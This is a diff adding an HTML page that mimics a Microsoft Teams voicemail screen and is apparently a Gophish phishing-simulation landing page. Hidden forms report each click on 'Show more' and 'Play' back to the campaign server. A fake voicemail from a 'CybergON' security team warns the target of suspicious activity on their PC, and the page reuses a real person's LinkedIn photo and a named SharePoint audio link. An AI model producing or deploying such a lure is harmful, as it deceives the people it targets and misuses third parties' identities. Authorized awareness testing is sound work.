@@ -1,0 +1,1039 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <title>Microsoft Teams | Voicemail </title>
+  <style>
+    /* -------------------------------------
+       RESET & BASE
+    ------------------------------------- */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #1e1e1e; /* Sfondo scuro generale */
+      color: #ffffff;
+      display: flex;
+      min-height: 100vh;
+      /* Aumentato per fare spazio a due barre fisse (50px + 50px) */
+      padding-top: 100px;
+    }
+
+    /* -------------------------------------
+       LOGO BAR (solo logo Teams)
+    ------------------------------------- */
+    .logo-bar {
+      width: 100%;
+      height: 50px;
+      background-color: #1e1e1e;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      border-bottom: 1px solid #3c3c3c;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 1001;
+    }
+
+    .teams-logo {
+      width: 50px;
+      height: auto;
+    }
+
+    /* Avatar generico per l'account */
+    .avatar-wrapper {
+      margin-left: auto;
+      position: relative;
+      width: 30px;
+      height: 30px;
+  
+      /* Colore di sfondo “azzurrino/grigio” */
+      background-color: #d9e2ef; 
+  
+      /* Cerchio + centratura */
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+  
+      /* Testo: font, peso, dimensione */
+      font-family: "Segoe UI", sans-serif;
+      font-weight: 500;
+      font-size: 12px;
+      color: #1e1e1e; /* Colore del testo (GS) */
+      cursor: pointer;
+    }
+
+    /* Iniziali dell’utente */
+    .avatar-initials {
+      text-transform: uppercase; 
+    }
+
+  
+
+   /* Pallino di stato già incluso nell'immagine */
+  .avatar-status {
+    position: absolute;
+    bottom: 0px;
+    right: 0;
+    width: 11px; /* Adatta alla dimensione reale del pallino */
+    height: 11px;
+    fill: #3ba55c;
+    stroke: #1e1e1e;
+    stroke-width: 0.7px;
+  }
+
+  /* Tooltip nascosto */
+  .avatar-wrapper::after {
+    content: attr(data-email); /* Usa l'attributo data-email */
+    position: absolute;
+    bottom: -35px; /* Sposta sotto l'avatar */
+    left: 50%;
+    transform: translateX(-90%);
+    background-color: #252526;
+    color: white;
+    padding: 5px 8px;
+    border-radius: 5px;
+    font-size: 12px;
+    white-space: nowrap;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.2s ease-in-out, visibility 0.2s ease-in-out;
+  }
+
+  /* Mostra il tooltip quando si passa sopra */
+  .avatar-wrapper:hover::after {
+    opacity: 1;
+    visibility: visible;
+  }
+
+
+    /* -------------------------------------
+       TOP PANEL (Calls & Personal)
+    ------------------------------------- */
+    .top-panel {
+      width: 100%;
+      height: 50px;
+      background-color: #252526;
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #3c3c3c;
+      position: fixed;
+      top: 50px; /* subito sotto la logo-bar */
+      left: 0;
+      z-index: 1000;
+      padding: 0 80px;
+    }
+
+    .top-panel-left {
+      display: flex;
+      align-items: center;
+      margin-right: 25px;
+    }
+
+    .calls-icon-container {
+      background-color: #464EB8; 
+      color: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 24px;
+      height: 28px;
+      border-radius: 4px;
+      margin-right: 10px;
+    }
+
+    .calls-text {
+      font-size: 1.25rem;
+      color: #ffffff;
+    }
+
+    .personal-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      height: 100%;
+      margin-left: 30px;
+    }
+
+    .personal-text {
+      font-size: 0.9rem;
+      color: #ffffff;
+      line-height: 50px;
+    }
+
+    .personal-underline {
+      width: 45px;
+      height: 3px;
+      background-color: #464EB8; 
+      margin-top: -10px;
+    }
+
+    /* -------------------------------------
+       CONTAINER PRINCIPALE
+    ------------------------------------- */
+    .teams-container {
+      display: flex;
+      flex: 1; 
+    }
+
+    /* -------------------------------------
+       COLONNA DI SINISTRA (History)
+    ------------------------------------- */
+    .left-panel {
+      width: 75%;
+      border-right: 1px solid #3c3c3c;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .tabs {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 16px;
+      background-color: #252526;
+      border-bottom: 1px solid #3c3c3c;
+      height: 60px;
+    }
+    .history-title {
+      font-size: 1rem;
+      color: #ffffff;
+    }
+    .history-title strong {
+      font-weight: bold;
+    }
+
+    .tab {
+      background-color: #464EB8;
+      border-radius: 16px;
+      padding: 6px 12px;
+      color: #ffffff;
+      cursor: pointer;
+      font-size: 0.9rem;
+    }
+
+    .history-list {
+      flex: 1;
+      background-color: #252526;
+      padding: 16px;
+    }
+
+    .history-item {
+      padding: 8px;
+      margin-bottom: 16px;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+    .history-item:hover {
+      background-color: #2a2a2a;
+    }
+
+    .history-item-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .history-left {
+      display: flex;
+      align-items: center;
+    }
+
+    .history-avatar {
+      position: relative;
+      width: 45px;
+      height: 45px;
+      border-radius: 50%;
+      margin-right: 8px;
+      background-size: cover;
+      background-position: center;
+      background-image: url('https://media.licdn.com/dms/image/v2/C4E03AQHf7An_5VZm7w/profile-displayphoto-shrink_800_800/profile-displayphoto-shrink_800_800/0/1637229855599?e=1746662400&v=beta&t=crrUPjfCIkQgf9KOEAf8yrq5ciJimKX0OcBF2a1bBH4');
+    }
+
+    .presence-indicator-history {
+        position: absolute;
+        bottom: 0;           
+        right: 0;
+        width: 14px;         
+        height: 14px;
+        background-color: #f04747; 
+        border-radius: 50%;
+        border: 2px solid #252526; /* bordino per “staccare” dal bg scuro */
+    }
+
+    .caller-info {
+      display: flex;
+      flex-direction: column;
+    }
+    .caller-name {
+      font-size: 0.95rem;
+      color: #ffffff;
+    }
+    .call-info {
+      font-size: 0.85rem;
+      color: #f04747;
+      display: flex;
+      align-items: center;
+    }
+    .call-icon {
+      margin-right: 5px;
+      display: inline-flex;
+      vertical-align: middle;
+    }
+    .call-time {
+      font-size: 0.85rem;
+      color: #8e8e8e;
+      margin-left: 16px;
+    }
+
+
+      /* -------------------------------------
+       COLONNA DESTRA (Base Panel)
+    ------------------------------------- */
+    .right-panel-base {    
+      width: 25%;
+      background-color: #252526;
+      padding: 8px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center; /* Centra il contenuto del pannello verticalmente */
+      align-items: center; /* Centra il contenuto orizzontalmente */
+    }
+
+    .image-container {
+        display: flex;
+        margin-left: auto;
+        margin-right: auto;
+        width: 60%;
+        height: 60%;
+    }
+
+
+    /* -------------------------------------
+       COLONNA DESTRA (Details)
+    ------------------------------------- */
+    .right-panel {
+      width: 25%;
+      background-color: #252526;
+      padding: 16px;
+      flex-direction: column;
+      display: flex;
+    }
+
+    .container {
+        display: flex;
+        justify-content: space-between;  /* Distribuisce gli elementi agli estremi (sinistra e destra) */
+        align-items: center;
+        margin-bottom: 16px; 
+        padding: 8px;            /* Centra verticalmente gli elementi */                  
+    }
+
+    .details-title {
+      font-size: 1rem;
+      font-weight: bold;
+    }
+
+    .close-btn {
+        width: 15px;
+        height: 15px;
+        background-size: cover;
+        background-repeat: no-repeat;
+        border: none;
+        cursor: pointer;
+        background-color: transparent;
+        position: relative;
+    }
+
+    .tooltip {
+        position: absolute;
+        top: 25px; /* Posiziona il tooltip sopra la X */
+        left: 50%;
+        transform: translateX(-50%);
+        background-color: black;
+        color: white;
+        text-align: center;
+        padding: 8px;
+        font-size: 13px;
+        border-radius: 5px;
+        opacity: 0; /* Nascosto inizialmente */
+        pointer-events: none; /* Impedisce che il tooltip interferisca con il clic */
+        transition: opacity 0.3s ease; /* Aggiunge una transizione fluida */
+    }
+
+    .close-btn:hover .tooltip {
+        opacity: 1; /* Mostra il tooltip al passaggio del mouse */
+    }
+
+    .details-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 16px;
+      padding: 8px;
+    }
+
+
+    .details-avatar {
+      position: relative;
+      width: 85px;
+      height: 85px;
+      border-radius: 50%;
+      background-color: #3a3a3a;
+      background-size: cover;
+      background-position: center;
+      margin-right: 12px;
+      background-image: url('https://media.licdn.com/dms/image/v2/C4E03AQHf7An_5VZm7w/profile-displayphoto-shrink_800_800/profile-displayphoto-shrink_800_800/0/1637229855599?e=1746662400&v=beta&t=crrUPjfCIkQgf9KOEAf8yrq5ciJimKX0OcBF2a1bBH4');
+    }
+
+    .presence-indicator-details {
+        position: absolute;
+        bottom: 0;           
+        right: 0;
+        width: 25px;         
+        height: 25px;
+        background-color: #f04747; 
+        border-radius: 50%;
+        border: 2px solid #252526; /* bordino per “staccare” dal bg scuro */
+    }
+
+    .details-userinfo {
+      line-height: 1.2;
+    }
+
+    .details-userinfo .name {
+      font-weight: bold;
+      font-size: 0.9rem;
+      color: #ffffff;
+      margin-left: 10px;
+    }
+
+    .details-userinfo .role {
+      font-size: 0.8rem;
+      color: #cccccc;
+      margin-left: 10px;
+    }
+
+    .separator {
+      width: 100%;
+      height: 1px;
+      background-color: #3c3c3c;
+      margin-bottom: 30px;
+    }
+
+    .voicemail-box {
+      background-color: #1e1e1e;
+      border-radius: 4px;
+      padding: 10px;
+      margin-bottom: 16px;
+      border: 1px solid #3c3c3c;
+    }
+
+    .voicemail-title {
+      font-size: 1rem;
+      color: #ffffff;
+      margin-bottom: 15px;
+    }
+
+    .voicemail-box h4 {
+      margin: 0 0 8px 0;
+      font-size: 1rem;
+      font-weight: normal;
+      color: #ffffff;
+    }
+    .voicemail-message {
+      font-size: 0.9rem;
+      color: #cccccc;
+      margin-bottom: 8px;
+      overflow: hidden;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+    }
+    .show-more {
+      color: #464EB8;
+      font-size: 0.9rem;
+      cursor: pointer;
+      margin-bottom: 8px;
+      display: inline-block;
+    }
+
+    .voicemail-footer {
+        font-size: 0.9rem;
+        color: #cccccc;
+        border: 1px solid #3c3c3c;
+        border-radius: 4px;
+        padding: 10px;
+        background-color: #1e1e1e;
+    }
+
+    .voicemail-footer .bottom-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+
+    .voicemail-footer .date {
+        display: block;
+        margin-bottom: 8px;
+        color: #ffffff;
+    }
+
+    .voicemail-footer .forwarded {
+      color: #f04747;
+    }
+
+    .voicemail-footer .time {
+      font-size: 0.8rem;
+      color: #f04747;
+    }
+
+    /* -------------------------------------
+       PLAYER AUDIO PERSONALIZZATO
+    ------------------------------------- */
+    .custom-audio-player {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background-color: #1e1e1e;
+      padding: 8px 12px;
+      border-radius: 4px;
+    }
+
+    /* Pulsante Play/Pause */
+    .play-pause-btn {
+      background: none;
+      border: none;
+      color: #8e8e8e;
+      cursor: pointer;
+      font-size: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 24px;
+      height: 24px;
+      /* Triangolo "Play" */
+    }
+    .play-pause-btn svg {
+      width: 35px;
+      height: 35px;
+      fill: #1e1e1e;
+      stroke: #464EB8;
+      stroke-width: 1;/* Colore icona */
+    }
+    .play-pause-btn:hover svg {
+      fill: #464EB8;
+    }
+
+    /* Barra di avanzamento (container) */
+    .progress-container {
+      position: relative;
+      flex: 1; /* Occupa tutto lo spazio disponibile */
+      height: 4px;
+      background-color: #3c3c3c;
+      border-radius: 2px;
+      cursor: pointer;
+    }
+    /* Barra di avanzamento effettiva */
+    .progress-bar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 4px;
+      background-color: #464EB8; /* viola */
+      border-radius: 2px;
+      width: 0%; /* si aggiorna via JS */
+    }
+
+    /* Pallino viola */
+    .progress-handle {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 16px;
+      height: 16px;
+      background-color: #464EB8;
+      border-radius: 50%;
+      pointer-events: none; /* per cliccare sotto, se vuoi drag personalizzato vanno fatte logiche aggiuntive */
+      left: 0%;
+    }
+
+    /* Tempo corrente */
+    .current-time {
+      font-size: 0.8rem;
+      color: #ffffff;
+      min-width: 40px; /* per evitare salti di layout */
+      text-align: right;
+    }
+
+    /* Selettore velocità di riproduzione */
+    .playback-rate {
+      position: relative;
+      color: #ffffff;
+      font-size: 0.8rem;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+    }
+    .rate-value {
+      margin-right: 4px;
+    }
+    .rate-dropdown-icon {
+      width: 14px;
+      height: 14px;
+      fill: #8e8e8e;
+    }
+    .playback-rate:hover .rate-dropdown-icon {
+      fill: #cfcfcf;
+    }
+
+    /* Menu a discesa con le velocità */
+    .rate-dropdown {
+      display: none;
+      position: absolute;
+      bottom: -80px; /* scende sotto */
+      left: 0;
+      background-color: #252526;
+      border: 1px solid #3c3c3c;
+      border-radius: 4px;
+      padding: 4px 0;
+      min-width: 50px;
+      z-index: 999;
+    }
+    .rate-option {
+      padding: 4px 8px;
+      color: #ffffff;
+      font-size: 0.8rem;
+      cursor: pointer;
+    }
+    .rate-option:hover {
+      background-color: #3c3c3c;
+    }
+    .playback-rate.open .rate-dropdown {
+      display: block;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Form nascosto per l'invio a Gophish del click su show more-->
+  <form id="hiddenCaptureForm" method="post" style="display:none;" action="">
+    <input type="hidden" name="Action" value="Click Show More">
+  </form>
+
+  <!-- Form nascosto per l'invio a Gophish del click su play audio-->
+  <form id="hiddenCaptureFormAudio" method="post" style="display:none;" action="">
+    <input type="hidden" name="Action" value="Click Play Audio">
+  </form>
+
+
+  <!-- LOGO BAR: Teams logo + account logo -->
+  <div class="logo-bar">
+      <div class="teams-logo">
+        <svg width="1em" height="1em" viewBox="2 2 20 20" xmlns="http://www.w3.org/2000/svg" 
+             role="presentation" data-tid="titlebar-teams-icon" font-size="20px" fill="currentColor" 
+             aria-hidden="true"><path d="M21.0344 10.0012H16.8734L15.7124 10.9402V15.5972C15.7124 17.3262 17.1134 18.7282 18.8424 18.7282C20.5724 18.7282 21.9734 17.3262 21.9734 15.5972V10.9402C21.9734 10.4222 21.5534 10.0012 21.0344 10.0012Z" 
+             fill="#5059C9"></path><path d="M22 7C22 8.104 21.105 9 20 9C18.895 9 18 8.104 18 7C18 5.896 18.895 5 20 5C21.105 5 22 5.896 22 7Z" 
+             fill="#5059C9"></path><path d="M9.89214 10.0046H17.0961C17.5921 10.0046 17.9941 10.4066 17.9941 10.9026V16.5946C17.9941 19.0306 16.0201 21.0046 13.5841 21.0046H13.4041C10.9681 21.0046 8.99414 19.0306 8.99414 16.5946V10.9026C8.99414 10.4066 9.39614 10.0046 9.89214 10.0046Z" 
+             fill="#7B83EB"></path><path d="M16.9065 5.99999C16.9065 7.60499 15.6055 8.90699 13.9995 8.90699C12.3945 8.90699 11.0935 7.60499 11.0935 5.99999C11.0935 4.39499 12.3945 3.09299 13.9995 3.09299C15.6055 3.09299 16.9065 4.39499 16.9065 5.99999Z" 
+             fill="#7B83EB"></path><path opacity="0.5" fill-rule="evenodd" clip-rule="evenodd" d="M15.0001 8.6814V8.0004C15.0001 7.4504 14.5281 7.0004 13.9511 7.0004H11.2711C11.6881 8.0944 12.7391 8.8754 13.9801 8.8754C14.3401 8.8754 14.6821 8.8014 15.0001 8.6814ZM8.99414 10.9024C8.99414 10.4064 9.39614 10.0044 9.89214 10.0044H15.0001V17.8394C15.0001 18.3894 14.3821 19.0004 13.7451 19.0004H9.71514C9.26214 18.3074 8.99414 17.4834 8.99414 16.5944V10.9024Z" 
+             fill="black"></path><path d="M3 18C2.45 18 2 17.55 2 17V7C2 6.45 2.45 6 3 6H13C13.55 6 14 6.45 14 7V17C14 17.55 13.55 18 13 18H3Z" fill="#4B53BC"></path><path d="M11.0001 10H8.83511V15.82H7.41211V10H5.23511V8.57001H11.0001V10Z" fill="white"></path>
+        </svg>
+      </div>
+
+
+      <div class="avatar-wrapper"  data-email="{{.Email}}"  data-firstname="{{.FirstName}}" data-lastname="{{.LastName}}">
+        <span class="avatar-initials"></span>
+        <span class="avatar-status">
+          <!-- Icona "check" in SVG -->
+          <svg viewBox="0 0 10 10" aria-hidden="true">
+            <path d="M5 10A5 5 0 1 0 5 0a5 5 0 0 0 0 10Zm2.1-5.9L4.85 6.35a.5.5 0 0 1-.7 0l-1-1a.5.5 0 0 1 .7-.7l.65.64 1.9-1.9a.5.5 0 0 1 .7.71Z"></path>
+          </svg>
+        </span>
+      </div>
+  </div>
+
+  <!-- TOP PANEL: Calls & Personal -->
+  <div class="top-panel">
+    <!-- Calls: icona + testo -->
+    <div class="top-panel-left">
+      <div class="calls-icon-container">
+        <!-- Icona telefono (solo la prima) -->
+          <svg font-size="20px" class="fui-Icon-filled ___12fm75w f1w7gpdv fez10in fg4l7m0" 
+               fill="currentColor" aria-hidden="true" width="1em" height="1em" viewBox="0 0 20 20" 
+               xmlns="http://www.w3.org/2000/svg">
+            <path d="M6.99 2.07A2 2 0 0 1 9.3 3l.08.15.66 1.47a2.5 2.5 0 0 1-.44 2.72l-.13.13-1.05.98c-.19.17-.04.86.64 2.04.6 1.06 1.1 1.56 1.35 1.58h.1l2.05-.64a1.5 1.5 0 0 1 1.56.45l.1.11 1.35 1.88a2 2 0 0 1-.13 2.5l-.12.12-.54.52a3.5 3.5 0 0 1-3.72.7c-1.93-.78-3.69-2.56-5.29-5.33S3.52 7.2 3.82 5.14a3.5 3.5 0 0 1 2.26-2.8l.19-.06.72-.21Z"
+                  fill="currentColor"></path>
+          </svg>
+      </div>
+      <span class="calls-text"><strong>Calls</strong></span>
+    </div>
+
+    <!-- "Personal" con barretta sotto -->
+    <div class="personal-container">
+      <span class="personal-text">Personal</span>
+      <div class="personal-underline"></div>
+    </div>
+  </div>
+
+  <div class="teams-container">
+    <!-- COLONNA SINISTRA -->
+    <div class="left-panel">
+      <!-- Barra in alto con 'History' e tab 'Voicemail' -->
+      <div class="tabs">
+        <div class="history-title"><strong>History</strong></div>
+        <div class="tab"><strong>Voicemail</strong></div>
+      </div>
+
+      <!-- Lista delle chiamate / History -->
+      <div class="history-list">
+        <div id= "HistoryItem" class="history-item">
+          <div class="history-item-header">
+            <!-- Parte sinistra: Avatar + Info chiamante -->
+            <div class="history-left">
+              <div class="history-avatar">
+                <span class="presence-indicator-history"></span>
+              </div>
+              <div class="caller-info">
+                <div class="caller-name">Simone Errico</div>
+                <div class="call-info">
+                  <span class="call-icon">
+                    <svg width="21px" height="21px" viewBox="0 0 20 20" fill="none" 
+                         stroke="currentColor" stroke-width="0.8" stroke-linecap="round" 
+                         stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg">
+                      <path d="M6 10a1 1 0 1 1 2 0 1 1 0 0 1-2 0Zm6 0a1 1 0 1 1 2 0 1 1 0 0 1-2 0ZM2 
+                               6c0-1.1.9-2 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6Zm7 4a2 
+                               2 0 0 0-.27-1h2.54A2 2 0 1 0 13 8H7a2 2 0 1 0 2 2Z">
+                      </path>
+                    </svg>
+                  </span>
+                  Forwarded to voicemail
+                </div>
+              </div>
+            </div>
+            <!-- Parte destra: Ora della chiamata -->
+            <div class="call-time">10:51</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- COLONNA DESTRA Base--> 
+    <div id= "PanelBase" class="right-panel-base">
+      <img src="https://statics.teams.cdn.office.net/evergreen-assets/illustrations/empty_states/add_members.svg" 
+           alt="Voicemail" class="image-container">
+    </div>
+
+    <!-- COLONNA DESTRA -->
+    <div id= "DetailBox" class="right-panel" style="display: none;">
+
+        <div class="container">
+            <div class="details-title">Details</div>
+            <button id="closeBtn" class="close-btn">
+                <svg width="25" height="25" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M6 6L18 18" stroke="grey" stroke-width="2" stroke-linecap="round"/>
+                    <path d="M6 18L18 6" stroke="grey" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+                <span class="tooltip">Close</span>
+            </button>
+        </div>
+      
+      <!-- Header con Avatar e info utente (box) -->
+      <div class="details-header">
+        <div class="details-avatar">
+            <span class="presence-indicator-details"></span>
+        </div>
+        <div class="details-userinfo">
+          <div class="name">Simone Errico</div>
+          <div class="role">Security Project Manager</div>
+        </div>
+      </div>
+
+      <div class="separator"></div>
+
+      <!-- Voicemail box -->
+      <div class="voicemail-box">
+        <div class="voicemail-title"><strong>Voicemail</strong></div>
+        
+        <div class="voicemail-message" id="voicemailText">
+            Ciao. sono Simone del team di CybergON. Ho provato a chiamarti via Teams ma non ho ricevuto risposta. 
+            Ti sto contattando perchè abbiamo riscontrato un’anomalia sul sistema: alcuni pc, incluso il tuo, 
+            hanno mostrato attività sosp...
+        </div>
+        
+        <span class="show-more" id="toggleText"><strong>Show more</strong></span>
+
+        <!-- Player Audio PERSONALIZZATO -->
+        <div class="custom-audio-player" id="customPlayer">
+          <!-- Pulsante Play/Pause -->
+          <button class="play-pause-btn" id="playPauseBtn">
+            <!-- Icona Play di default -->
+            <svg viewBox="0 0 24 24">
+              <path d="M5 3l14 9-14 9V3z"></path>
+            </svg>
+          </button>
+          <!-- Barra di avanzamento -->
+          <div class="progress-container" id="progressContainer">
+            <div class="progress-bar" id="progressBar"></div>
+            <div class="progress-handle" id="progressHandle"></div>
+          </div>
+          <!-- Tempo corrente -->
+          <span class="current-time" id="currentTime">0:00</span>
+          <!-- Velocità di riproduzione -->
+          <div class="playback-rate" id="playbackRate">
+            <span class="rate-value" id="rateValue">1x</span>
+            <!-- freccia verso il basso -->
+            <svg class="rate-dropdown-icon" viewBox="0 0 24 24">
+              <path d="M7 10l5 5 5-5"></path>
+            </svg>
+            <!-- Menu a tendina con le opzioni -->
+            <div class="rate-dropdown" id="rateDropdown">
+              <div class="rate-option" data-rate="2">2x</div>
+              <div class="rate-option" data-rate="1.5">1.5x</div>
+              <div class="rate-option" data-rate="1">1x</div>
+              <div class="rate-option" data-rate="0.5">0.5x</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Audio nascosto -->
+        <audio id="voicemailAudio" style="display:none;">
+          <source src="https://elmecinformaticaspa-my.sharepoint.com/personal/gabriele_sassi_elmec_it/Documents/def.wav" type="audio/mpeg">
+          Il tuo browser non supporta l'elemento audio.
+        </audio>
+
+        <div class="audio-info">
+        </div>
+      </div>
+
+      <!-- Data e forwarded info (box) -->
+      <div class="voicemail-footer">
+        <span class="date"><strong>March 5, 2025</strong></span>
+        <div class="bottom-row"> 
+          <span class="forwarded">
+            <span class="call-icon">
+                <svg width="21.5px" height="21.5px" viewBox="0 0 20 20" fill="none" 
+                     stroke="currentColor" stroke-width="0.8" stroke-linecap="round" 
+                     stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M6 10a1 1 0 1 1 2 0 1 1 0 0 1-2 0Zm6 0a1 1 0 1 1 2 0 1 1 0 0 1-2 0ZM2 
+                           6c0-1.1.9-2 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6Zm7 4a2 
+                           2 0 0 0-.27-1h2.54A2 2 0 1 0 13 8H7a2 2 0 1 0 2 2Z">
+                  </path>
+                </svg>
+              </span>Forwarded to voicemail</span>
+          <span class="time">10:30 AM</span>
+        </div>
+      </div>
+  </div>
+
+
+  <script>
+
+
+    // Iniziali avatar impostate in base a utente
+    document.addEventListener('DOMContentLoaded', function() {
+      const avatarWrapper = document.querySelector('.avatar-wrapper');
+  
+      if (avatarWrapper) {
+        const firstName = avatarWrapper.getAttribute('data-firstname');
+        const lastName  = avatarWrapper.getAttribute('data-lastname');
+      
+        // Calcola le iniziali solo se i dati esistono
+        const initials = (firstName ? firstName.charAt(0).toUpperCase() : '') +
+                       (lastName ? lastName.charAt(0).toUpperCase() : '');
+      
+        const initialsElement = avatarWrapper.querySelector('.avatar-initials');
+        if (initialsElement) {
+          initialsElement.textContent = initials;
+          console.log("Iniziali impostate:", initials);
+        } else {
+          console.log("Elemento .avatar-initials non trovato");
+        }
+      }
+    });
+
+    // Mostra dettagli voicemail
+    document.getElementById('HistoryItem').addEventListener('click', function() {
+      document.getElementById('DetailBox').style.display = 'flex';
+      document.getElementById('PanelBase').style.display = 'none';
+    });
+
+    // Mostra/Nascondi testo "Show more"
+    document.getElementById('toggleText').addEventListener('click', function() {
+      
+      event.preventDefault(); 
+
+      let textElement = document.getElementById('voicemailText');
+      let buttonText = document.getElementById('toggleText');
+      
+      if (textElement.style.display === '-webkit-box') {
+        textElement.style.display = 'block';
+        buttonText.innerHTML = '<strong>Show less</strong>';
+
+        // Recupera il form nascosto
+        let form = document.getElementById('hiddenCaptureForm');
+        // Crea un oggetto URLSearchParams a partire dai dati presenti nel form
+        const params = new URLSearchParams(new FormData(form));
+       
+
+        // Usa fetch per inviare i dati senza ricaricare la pagina
+        fetch(form.action, {
+          method: 'POST',
+          body: params.toString(),
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          }
+        })
+        .then(response => {
+        return response.text();
+        })
+        .then(responseText => {
+          console.log('Risposta del server:', responseText);
+        })
+        .catch(error => {
+          console.error('Errore:', error);
+        });
+      } 
+      else {
+        textElement.style.display = '-webkit-box';
+        buttonText.innerHTML = '<strong>Show more</strong>';}
+    });
+
+    //chiudi finestra details
+    document.getElementById('closeBtn').addEventListener('click', function() {
+      document.getElementById('DetailBox').style.display = 'none';
+      document.getElementById('PanelBase').style.display = 'flex';
+    });
+
+    // ---------------------------
+    // AUDIO PLAYER PERSONALIZZATO
+    // ---------------------------
+    const audio = document.getElementById('voicemailAudio');
+    const playPauseBtn = document.getElementById('playPauseBtn');
+    const progressContainer = document.getElementById('progressContainer');
+    const progressBar = document.getElementById('progressBar');
+    const progressHandle = document.getElementById('progressHandle');
+    const currentTimeEl = document.getElementById('currentTime');
+    const playbackRate = document.getElementById('playbackRate');
+    const rateValue = document.getElementById('rateValue');
+    const rateDropdown = document.getElementById('rateDropdown');
+    const rateOptions = document.querySelectorAll('.rate-option');
+
+    let isPlaying = false;
+
+    // Play/Pause
+    playPauseBtn.addEventListener('click', () => {
+      if (!isPlaying) {
+
+        event.preventDefault(); //blocca invio del form
+        audio.play();
+
+        // Recupera il form nascosto
+        let form = document.getElementById('hiddenCaptureFormAudio');
+        // Crea un oggetto URLSearchParams a partire dai dati presenti nel form
+        const params = new URLSearchParams(new FormData(form));
+       
+
+        // Usa fetch per inviare i dati senza ricaricare la pagina
+        fetch(form.action, {
+          method: 'POST',
+          body: params.toString(),
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          }
+        })
+        .then(response => {
+        return response.text();
+        })
+        .then(responseText => {
+          console.log('Risposta del server:', responseText);
+        })
+        .catch(error => {
+          console.error('Errore:', error);
+        });
+
+      }else {
+        audio.pause();
+      }
+    });
+
+    // Cambia icona in base allo stato (play/pausa)
+    audio.addEventListener('play', () => {
+      isPlaying = true;
+      // Icona "Pausa" -> due rettangoli
+      playPauseBtn.innerHTML = `
+        <svg viewBox="0 0 24 24">
+          <path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"></path>
+        </svg>
+      `;
+    });
+    audio.addEventListener('pause', () => {
+      isPlaying = false;
+      // Icona "Play" -> triangolo
+      playPauseBtn.innerHTML = `
+        <svg viewBox="0 0 24 24">
+          <path d="M5 3l14 9-14 9V3z"></path>
+        </svg>
+      `;
+    });
+
+    // Avanzamento automatico progress bar
+    audio.addEventListener('timeupdate', () => {
+      const { currentTime, duration } = audio;
+      if (duration) {
+        const percent = (currentTime / duration) * 100;
+        progressBar.style.width = `${percent}%`;
+        progressHandle.style.left = `calc(${percent}% - 6px)`; 
+        // -6px per centrare il pallino
+        currentTimeEl.textContent = formatTime(currentTime);
+      }
+    });
+
+    // Salto col click sulla barra
+    progressContainer.addEventListener('click', (e) => {
+      const width = progressContainer.clientWidth;
+      const clickX = e.offsetX;
+      const duration = audio.duration;
+      if (duration) {
+        const newTime = (clickX / width) * duration;
+        audio.currentTime = newTime;
+      }
+    });
+
+    // Format time (secondi -> mm:ss)
+    function formatTime(sec) {
+      const minutes = Math.floor(sec / 60);
+      const seconds = Math.floor(sec % 60);
+      return `${minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
+    }
+
+    // Gestione velocità
+    playbackRate.addEventListener('click', () => {
+      playbackRate.classList.toggle('open');
+    });
+
+    rateOptions.forEach(option => {
+      option.addEventListener('click', () => {
+        const newRate = parseFloat(option.getAttribute('data-rate'));
+        audio.playbackRate = newRate;
+        rateValue.textContent = `${newRate}x`;
+        playbackRate.classList.remove('open');
+      });
+    });
+
+    // Chiude il menu velocità se si clicca altrove
+    document.addEventListener('click', (e) => {
+      if (!playbackRate.contains(e.target)) {
+        playbackRate.classList.remove('open');
+      }
+    });
+
+  </script>
+
+</body>
+</html>
